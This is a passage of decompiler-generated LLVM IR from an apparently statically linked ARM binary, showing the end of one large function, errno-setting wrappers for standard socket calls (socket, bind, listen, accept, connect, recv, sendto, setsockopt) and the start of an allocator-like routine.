dec_label_pc_f4f4:                                ; preds = %dec_label_pc_f4e0
  %v0_f4f4 = load i32, i32* @r4, align 4
  %v1_f4f4 = add i32 %v0_f4f4, -4
  store i32 %v1_f4f4, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_f4f4, 8
  br i1 %tmp32, label %dec_label_pc_f774, label %dec_label_pc_f500

dec_label_pc_f500:                                ; preds = %dec_label_pc_f4f4
  %v1_f500 = add i32 %v0_f4f4, -12
  store i32 %v1_f500, i32* %r3.global-to-local, align 4
  %v0_f504 = load i32, i32* @r7, align 4
  %v1_f504 = add i32 %v0_f504, 4
  store i32 %v1_f504, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_f510 = inttoptr i32 %v1_f504 to i32*
  store i32 %v0_f504, i32* %v3_f510, align 4
  %v0_f514 = load i32, i32* @r5, align 4
  %v1_f514 = load i32, i32* @sb, align 4
  %v2_f514 = add i32 %v1_f514, 4
  %v3_f514 = inttoptr i32 %v2_f514 to i32*
  store i32 %v0_f514, i32* %v3_f514, align 4
  %tmp33 = icmp ult i32 %v1_f500, 32
  br i1 %tmp33, label %dec_label_pc_f774, label %dec_label_pc_f51c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f500
  %v0_f51c = load i32, i32* @r4, align 4
  %v1_f51c = add i32 %v0_f51c, -44
  store i32 %v1_f51c, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_f51c, 256
  br i1 %tmp34, label %dec_label_pc_f774, label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f51c
  %v0_f528 = load i32, i32* @r7, align 4
  %v1_f528 = add i32 %v0_f528, 44
  store i32 %v1_f528, i32* @r6, align 4
  %v1_f52c = add i32 %v0_f528, 12
  store i32 %v1_f52c, i32* %r3.global-to-local, align 4
  %v0_f530 = load i32, i32* @fp, align 4
  store i32 %v0_f530, i32* @r1, align 4
  store i32 %v1_f51c, i32* %r2.global-to-local, align 4
  store i32 %v1_f528, i32* %r0.global-to-local, align 4
  %v3_f540 = call i32 @function_ee60(i32 %v1_f528, i32 %v0_f530, i32 %v1_f51c)
  store i32 %v1_f52c, i32* %ip.global-to-local, align 4
  %v0_f548 = load i32, i32* @r6, align 4
  %v1_f548 = load i32, i32* @r7, align 4
  %v2_f548 = add i32 %v1_f548, 12
  %v3_f548 = inttoptr i32 %v2_f548 to i32*
  store i32 %v0_f548, i32* %v3_f548, align 4
  %v0_f54c = load i32, i32* @fp, align 4
  store i32 %v0_f54c, i32* %r0.global-to-local, align 4
  %v0_f550 = load i32, i32* @r5, align 4
  %v1_f550 = load i32, i32* %ip.global-to-local, align 4
  %v2_f550 = add i32 %v1_f550, 4
  %v3_f550 = inttoptr i32 %v2_f550 to i32*
  store i32 %v0_f550, i32* %v3_f550, align 4
  %v0_f554 = load i32, i32* @r7, align 4
  %v2_f558 = inttoptr i32 %v0_f54c to i8*
  %v3_f558 = call i32 @function_12554(i8* %v2_f558, i32 %v0_f554)
  store i32 %v3_f558, i32* %r0.global-to-local, align 4
  %v2_f55c = icmp eq i32 %v3_f558, 0
  br i1 %v2_f55c, label %dec_label_pc_f5a0, label %dec_label_pc_f568

dec_label_pc_f568:                                ; preds = %dec_label_pc_f528
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_f56c = load i32, i32* @sl, align 4
  %v2_f56c = add i32 %v1_f56c, 8
  %v3_f56c = inttoptr i32 %v2_f56c to i32*
  store i32 2, i32* %v3_f56c, align 4
  %v0_f570 = load i32, i32* %r3.global-to-local, align 4
  %v2_f570 = mul i32 %v0_f570, 2
  %v1_f574 = load i32, i32* @sl, align 4
  %v2_f574 = add i32 %v1_f574, 12
  %v3_f574 = inttoptr i32 %v2_f574 to i32*
  store i32 %v2_f570, i32* %v3_f574, align 4
  %v3_f578 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f578, i32* %r2.global-to-local, align 4
  store i32 %v1_f52c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_f584 = load i32, i32* @r5, align 4
  store i32 %v0_f584, i32* %r0.global-to-local, align 4
  %v0_f588 = load i32, i32* @sl, align 4
  %v2_f588 = inttoptr i32 %v3_f578 to i32*
  store i32 %v0_f588, i32* %v2_f588, align 4
  %v0_f58c = load i32, i32* @r6, align 4
  %v1_f58c = load i32, i32* @sl, align 4
  %v2_f58c = inttoptr i32 %v1_f58c to i32*
  store i32 %v0_f58c, i32* %v2_f58c, align 4
  %v0_f590 = load i32, i32* @sb, align 4
  %v1_f590 = load i32, i32* @sl, align 4
  %v2_f590 = add i32 %v1_f590, 16
  %v3_f590 = inttoptr i32 %v2_f590 to i32*
  store i32 %v0_f590, i32* %v3_f590, align 4
  %v0_f594 = load i32, i32* %r3.global-to-local, align 4
  %v1_f594 = load i32, i32* @sl, align 4
  %v2_f594 = add i32 %v1_f594, 4
  %v3_f594 = inttoptr i32 %v2_f594 to i32*
  store i32 %v0_f594, i32* %v3_f594, align 4
  %v0_f598 = load i32, i32* @r5, align 4
  %v1_f598 = load i32, i32* %ip.global-to-local, align 4
  %v2_f598 = inttoptr i32 %v1_f598 to i32*
  store i32 %v0_f598, i32* %v2_f598, align 4
  br label %dec_label_pc_f778

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f528
  %v2_f5a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_f5a0, i32* @r5, align 4
  %v1_f5a4 = call i32 @function_12e4c(i32 0)
  store i32 ptrtoint (i32* @global_var_1f4b0.415 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_f5a0, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_f5bc = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f4b0.415 to i32), i32* %r0.global-to-local, align 4
  %v1_f5cc = call i32 @function_10838()
  store i32 %v2_f5a0, i32* @r0, align 4
  %v2_f5d8 = load i32, i32* @global_var_21dbc.420, align 4
  store i32 %v2_f5d8, i32* @r4, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_f5e8 = call i32 @function_10840()
  %v2_f5f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_21db0.423 to i32), i32* %r3.global-to-local, align 4
  %v0_f600 = load i32, i32* @fp, align 4
  store i32 %v0_f600, i32* %r0.global-to-local, align 4
  %v2_f604 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_f604, i32* %ip.global-to-local, align 4
  %v0_f608 = load i32, i32* @r4, align 4
  store i32 %v0_f608, i32* %r2.global-to-local, align 4
  %v6_f61c = inttoptr i32 %v0_f600 to i8*
  %v7_f61c = call i32 @function_12640(i8* %v6_f61c, i32 1, i32 %v0_f608, i32 ptrtoint (i32* @global_var_21db0.423 to i32), i32 %v2_f5f4, i32 %v2_f604)
  store i32 %v7_f61c, i32* %r0.global-to-local, align 4
  %v1_f620 = icmp slt i32 %v7_f61c, 0
  br i1 %v1_f620, label %.dec_label_pc_f74c_crit_edge, label %dec_label_pc_f630

.dec_label_pc_f74c_crit_edge:                     ; preds = %dec_label_pc_f5a0
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f630:                                ; preds = %dec_label_pc_f5a0
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_f644 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_f644, 255
  br i1 %tmp35, label %dec_label_pc_f6e0, label %dec_label_pc_f64c

dec_label_pc_f64c:                                ; preds = %dec_label_pc_f630
  %v3_f64c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_f64c, i32* %r0.global-to-local, align 4
  %v1_f650 = call i32 @function_fa5c(i32 %v3_f64c)
  %v3_f654 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f654, i32* %r0.global-to-local, align 4
  %v1_f658 = call i32 @function_fa5c(i32 %v3_f654)
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_f498, align 4
  br label %dec_label_pc_f778

dec_label_pc_f6e0:                                ; preds = %dec_label_pc_f630
  %v3_f6e4.pre = load i32, i32* %stack_var_-96, align 4
  %v0_f6e8.pre = load i32, i32* @r6, align 4
  store i32 %v1_f644, i32* %r2.global-to-local, align 4
  store i32 %v3_f6e4.pre, i32* @r1, align 4
  store i32 %v0_f6e8.pre, i32* %r0.global-to-local, align 4
  %v3_f6ec = call i32 @function_ee60(i32 %v0_f6e8.pre, i32 %v3_f6e4.pre, i32 %v1_f644)
  %v3_f6f0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_f6f0, i32* %r0.global-to-local, align 4
  %v1_f6f4 = call i32 @function_fa5c(i32 %v3_f6f0)
  store i32 %v1_f6f4, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_f6fc = icmp eq i32 %tmp7, 1
  br i1 %v7_f6fc, label %dec_label_pc_f704, label %dec_label_pc_f758

dec_label_pc_f704:                                ; preds = %dec_label_pc_f6e0
  store i32 4, i32* @r2, align 4
  %v0_f70c = load i32, i32* @r7, align 4
  store i32 %v0_f70c, i32* @r0, align 4
  %v0_f710 = call i32 @function_ec10()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_f52c, i32* %r2.global-to-local, align 4
  %v1_f71c = load i32, i32* @sl, align 4
  %v2_f71c = add i32 %v1_f71c, 8
  %v3_f71c = inttoptr i32 %v2_f71c to i32*
  store i32 2, i32* %v3_f71c, align 4
  %v0_f720 = load i32, i32* %r3.global-to-local, align 4
  %v2_f720 = mul i32 %v0_f720, 2
  store i32 %v2_f720, i32* %r3.global-to-local, align 4
  %v1_f724 = load i32, i32* @sl, align 4
  %v2_f724 = add i32 %v1_f724, 12
  %v3_f724 = inttoptr i32 %v2_f724 to i32*
  store i32 %v2_f720, i32* %v3_f724, align 4
  %v3_f728 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f728, i32* %r0.global-to-local, align 4
  %v0_f72c = load i32, i32* @r6, align 4
  %v1_f72c = load i32, i32* @sl, align 4
  %v2_f72c = inttoptr i32 %v1_f72c to i32*
  store i32 %v0_f72c, i32* %v2_f72c, align 4
  %v0_f730 = load i32, i32* @sb, align 4
  %v1_f730 = load i32, i32* @sl, align 4
  %v2_f730 = add i32 %v1_f730, 16
  %v3_f730 = inttoptr i32 %v2_f730 to i32*
  store i32 %v0_f730, i32* %v3_f730, align 4
  %v0_f734 = load i32, i32* %r2.global-to-local, align 4
  %v1_f734 = load i32, i32* @sl, align 4
  %v2_f734 = add i32 %v1_f734, 4
  %v3_f734 = inttoptr i32 %v2_f734 to i32*
  store i32 %v0_f734, i32* %v3_f734, align 4
  %v1_f738 = call i32 @function_fa5c(i32 %v3_f728)
  %v3_f73c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f73c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f744 = load i32, i32* @sl, align 4
  %v2_f744 = inttoptr i32 %v3_f73c to i32*
  store i32 %v0_f744, i32* %v2_f744, align 4
  %v0_f748 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f748, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %.dec_label_pc_f74c_crit_edge, %dec_label_pc_f704
  %v0_f750 = phi i32 [ 1, %.dec_label_pc_f74c_crit_edge ], [ %v0_f748, %dec_label_pc_f704 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_f750, i32* %v1_f498, align 4
  br label %dec_label_pc_f778

dec_label_pc_f758:                                ; preds = %dec_label_pc_f6e0
  %v3_f758 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f758, i32* %r0.global-to-local, align 4
  %v1_f75c = call i32 @function_fa5c(i32 %v3_f758)
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_f498, align 4
  br label %dec_label_pc_f778

dec_label_pc_f774:                                ; preds = %dec_label_pc_f4d0, %dec_label_pc_f51c, %dec_label_pc_f500, %dec_label_pc_f4f4, %dec_label_pc_f4e0
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %bb, %dec_label_pc_f4b4, %dec_label_pc_f4ac, %dec_label_pc_f454, %dec_label_pc_f758, %dec_label_pc_f74c, %dec_label_pc_f64c, %dec_label_pc_f568, %dec_label_pc_f774
  store i32 %v6_f428, i32* @r5, align 4
  store i32 %v9_f428, i32* @r6, align 4
  store i32 %v12_f428, i32* @r7, align 4
  store i32 %v15_f428, i32* @r8, align 4
  store i32 %v18_f428, i32* @sb, align 4
  store i32 %v21_f428, i32* @sl, align 4
  store i32 %v24_f428, i32* @fp, align 4
  %v29_f77c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_f77c

; uselistorder directives
  uselistorder i32 %v2_f720, { 1, 0 }
  uselistorder i32 %v1_f644, { 1, 2, 0 }
  uselistorder i32 %v1_f52c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f528, { 1, 0, 2 }
  uselistorder i32 %v1_f51c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f4e8.pre, { 0, 2, 1 }
  uselistorder i32 %v1_f4c4, { 1, 0 }
  uselistorder i32* %v1_f498, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_f438, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 4, 17, 18, 19, 21, 20, 22, 3, 23, 26, 25, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_f778, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_f774, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_f74c, { 1, 0 }
  uselistorder label %dec_label_pc_f4e0, { 1, 0 }
}

define i32 @function_f79c(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f79c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f79c = load i32, i32* @r4, align 4
  store i32 %v3_f79c, i32* %stack_var_-8, align 4
  %v5_f7a0 = inttoptr i32 %arg3 to i32*
  %v6_f7a0 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_f7a0)
  store i32 %v6_f7a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_f7a0, -4095
  br i1 %tmp, label %dec_label_pc_f7c0, label %dec_label_pc_f7b0

dec_label_pc_f7b0:                                ; preds = %dec_label_pc_f79c
  %v0_f7b0 = call i32 @function_cc08()
  %v0_f7b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7b4 = sub i32 0, %v0_f7b4
  %v2_f7b8 = inttoptr i32 %v0_f7b0 to i32*
  store i32 %v1_f7b4, i32* %v2_f7b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f79c, %dec_label_pc_f7b0
  %v0_f7c0 = phi i32 [ %v6_f7a0, %dec_label_pc_f79c ], [ -1, %dec_label_pc_f7b0 ]
  %v2_f7c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7c4, i32* @r4, align 4
  ret i32 %v0_f7c0

; uselistorder directives
  uselistorder i32 %v6_f7a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7c0, { 1, 0 }
}

define i32 @function_f7c8(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_f7c8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7c8 = load i32, i32* @r4, align 4
  store i32 %v3_f7c8, i32* %stack_var_-8, align 4
  %v5_f7cc = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_f7cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f7cc, -4095
  br i1 %tmp, label %dec_label_pc_f7ec, label %dec_label_pc_f7dc

dec_label_pc_f7dc:                                ; preds = %dec_label_pc_f7c8
  %v0_f7dc = call i32 @function_cc08()
  %v0_f7e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7e0 = sub i32 0, %v0_f7e0
  %v2_f7e4 = inttoptr i32 %v0_f7dc to i32*
  store i32 %v1_f7e0, i32* %v2_f7e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_f7dc
  %v0_f7ec = phi i32 [ %v5_f7cc, %dec_label_pc_f7c8 ], [ -1, %dec_label_pc_f7dc ]
  %v2_f7f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7f0, i32* @r4, align 4
  ret i32 %v0_f7ec

; uselistorder directives
  uselistorder i32 %v5_f7cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7ec, { 1, 0 }
}

define i32 @function_f7f4(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f7f4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7f4 = load i32, i32* @r4, align 4
  store i32 %v3_f7f4, i32* %stack_var_-8, align 4
  %v5_f7f8 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_f7f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f7f8, -4095
  br i1 %tmp, label %dec_label_pc_f818, label %dec_label_pc_f808

dec_label_pc_f808:                                ; preds = %dec_label_pc_f7f4
  %v0_f808 = call i32 @function_cc08()
  %v0_f80c = load i32, i32* %r4.global-to-local, align 4
  %v1_f80c = sub i32 0, %v0_f80c
  %v2_f810 = inttoptr i32 %v0_f808 to i32*
  store i32 %v1_f80c, i32* %v2_f810, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f818

dec_label_pc_f818:                                ; preds = %dec_label_pc_f7f4, %dec_label_pc_f808
  %v0_f818 = phi i32 [ %v5_f7f8, %dec_label_pc_f7f4 ], [ -1, %dec_label_pc_f808 ]
  %v2_f81c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f81c, i32* @r4, align 4
  ret i32 %v0_f818

; uselistorder directives
  uselistorder i32 %v5_f7f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f818, { 1, 0 }
}

define i32 @function_f820(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f820:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f820 = load i32, i32* @r4, align 4
  store i32 %v3_f820, i32* %stack_var_-8, align 4
  %v2_f824 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_f824, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_f824, -4095
  br i1 %tmp, label %dec_label_pc_f844, label %dec_label_pc_f834

dec_label_pc_f834:                                ; preds = %dec_label_pc_f820
  %v0_f834 = call i32 @function_cc08()
  %v0_f838 = load i32, i32* %r4.global-to-local, align 4
  %v1_f838 = sub i32 0, %v0_f838
  %v2_f83c = inttoptr i32 %v0_f834 to i32*
  store i32 %v1_f838, i32* %v2_f83c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f844

dec_label_pc_f844:                                ; preds = %dec_label_pc_f820, %dec_label_pc_f834
  %v0_f844 = phi i32 [ %v2_f824, %dec_label_pc_f820 ], [ -1, %dec_label_pc_f834 ]
  %v2_f848 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f848, i32* @r4, align 4
  ret i32 %v0_f844

; uselistorder directives
  uselistorder i32 %v2_f824, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f844, { 1, 0 }
}

define i32 @function_f84c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f84c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f84c = load i32, i32* @r4, align 4
  store i32 %v3_f84c, i32* %stack_var_-8, align 4
  %v5_f850 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_f850, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f850, -4095
  br i1 %tmp, label %dec_label_pc_f870, label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %dec_label_pc_f84c
  %v0_f860 = call i32 @function_cc08()
  %v0_f864 = load i32, i32* %r4.global-to-local, align 4
  %v1_f864 = sub i32 0, %v0_f864
  %v2_f868 = inttoptr i32 %v0_f860 to i32*
  store i32 %v1_f864, i32* %v2_f868, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %dec_label_pc_f84c, %dec_label_pc_f860
  %v0_f870 = phi i32 [ %v5_f850, %dec_label_pc_f84c ], [ -1, %dec_label_pc_f860 ]
  %v2_f874 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f874, i32* @r4, align 4
  ret i32 %v0_f870

; uselistorder directives
  uselistorder i32 %v5_f850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f870, { 1, 0 }
}

define i32 @function_f878(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_f878:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_f878 = load i32, i32* @r4, align 4
  store i32 %v3_f878, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_f884 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_f884, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f884, -4095
  br i1 %tmp, label %dec_label_pc_f8a4, label %dec_label_pc_f894

dec_label_pc_f894:                                ; preds = %dec_label_pc_f878
  %v0_f894 = call i32 @function_cc08()
  %v0_f898 = load i32, i32* %r4.global-to-local, align 4
  %v1_f898 = sub i32 0, %v0_f898
  %v2_f89c = inttoptr i32 %v0_f894 to i32*
  store i32 %v1_f898, i32* %v2_f89c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f8a4

dec_label_pc_f8a4:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f894
  %v0_f8a4 = phi i32 [ %v5_f884, %dec_label_pc_f878 ], [ -1, %dec_label_pc_f894 ]
  %v2_f8a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f8a8, i32* @r4, align 4
  ret i32 %v0_f8a4

; uselistorder directives
  uselistorder i32 %v5_f884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f8a4, { 1, 0 }
}

define i32 @function_f8ac(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f8ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8ac = load i32, i32* @r4, align 4
  store i32 %v3_f8ac, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_f8b4 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_f8b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_f8b4, -4095
  br i1 %tmp, label %dec_label_pc_f8d4, label %dec_label_pc_f8c4

dec_label_pc_f8c4:                                ; preds = %dec_label_pc_f8ac
  %v0_f8c4 = call i32 @function_cc08()
  %v0_f8c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8c8 = sub i32 0, %v0_f8c8
  %v2_f8cc = inttoptr i32 %v0_f8c4 to i32*
  store i32 %v1_f8c8, i32* %v2_f8cc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f8d4

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f8ac, %dec_label_pc_f8c4
  %v0_f8d4 = phi i32 [ %v5_f8b4, %dec_label_pc_f8ac ], [ -1, %dec_label_pc_f8c4 ]
  %v2_f8d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f8d8, i32* @r4, align 4
  ret i32 %v0_f8d4

; uselistorder directives
  uselistorder i32 %v5_f8b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f8d4, { 1, 0 }
}

define i32 @function_f8dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f8dc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8dc = load i32, i32* @r4, align 4
  store i32 %v3_f8dc, i32* %stack_var_-8, align 4
  %v3_f8e0 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_f8e0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_f8e0, -4095
  br i1 %tmp, label %dec_label_pc_f900, label %dec_label_pc_f8f0

dec_label_pc_f8f0:                                ; preds = %dec_label_pc_f8dc
  %v0_f8f0 = call i32 @function_cc08()
  %v0_f8f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8f4 = sub i32 0, %v0_f8f4
  %v2_f8f8 = inttoptr i32 %v0_f8f0 to i32*
  store i32 %v1_f8f4, i32* %v2_f8f8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f900

dec_label_pc_f900:                                ; preds = %dec_label_pc_f8dc, %dec_label_pc_f8f0
  %v0_f900 = phi i32 [ %v3_f8e0, %dec_label_pc_f8dc ], [ -1, %dec_label_pc_f8f0 ]
  %v2_f904 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f904, i32* @r4, align 4
  ret i32 %v0_f900

; uselistorder directives
  uselistorder i32 %v3_f8e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f900, { 1, 0 }
}

define i32 @function_f908(i32 %arg1) local_unnamed_addr {
dec_label_pc_f908:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f908 = load i32, i32* @r4, align 4
  %v6_f908 = load i32, i32* @r5, align 4
  %v9_f908 = load i32, i32* @r6, align 4
  %v0_f90c = load i32, i32* %r0.global-to-local, align 4
  %v2_f90c = icmp eq i32 %v0_f90c, 0
  %v2_f910 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_f90c, label %bb, label %dec_label_pc_f91c

bb:                                               ; preds = %dec_label_pc_f908
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f924

dec_label_pc_f91c:                                ; preds = %dec_label_pc_f908
  %tmp = icmp ugt i32 %v0_f90c, -8
  br i1 %tmp, label %dec_label_pc_fa28, label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %bb, %dec_label_pc_f91c
  %v0_f924 = phi i32 [ %v0_f90c, %dec_label_pc_f91c ], [ 1, %bb ]
  %v1_f924 = add i32 %v0_f924, 4
  store i32 %v1_f924, i32* %stack_var_-20, align 4
  store i32 %v2_f910, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_21b08.425 to i32), i32* %r0.global-to-local, align 4
  %v1_f93c = call i32 @function_10838()
  store i32 ptrtoint (i32** @global_var_1f2ac.429 to i32), i32* %r0.global-to-local, align 4
  %v3_f948 = call i32 @function_fb4c(i32* bitcast (i32** @global_var_1f2ac.429 to i32*), i32 %v2_f910)
  store i32 %v3_f948, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21b08.425 to i32), i32* %r0.global-to-local, align 4
  store i32 63840, i32* @lr, align 4
  %v1_f95c = call i32 @function_10838()
  store i32 %v1_f95c, i32* %r0.global-to-local, align 4
  %v2_f960 = icmp eq i32 %v3_f948, 0
  br i1 %v2_f960, label %dec_label_pc_f968, label %dec_label_pc_fa18

dec_label_pc_f968:                                ; preds = %dec_label_pc_f924
  %v2_f96c = load i32, i32* @global_var_21b30.432, align 4
  store i32 %v2_f96c, i32* @r4, align 4
  %v2_f970 = load i32, i32* %stack_var_-20, align 4
  %v3_f974 = icmp ult i32 %v2_f970, %v2_f96c
  br i1 %v3_f974, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_f968
  %v3_f978 = add i32 %v2_f96c, -1
  %v2_f97c = add i32 %v3_f978, %v2_f970
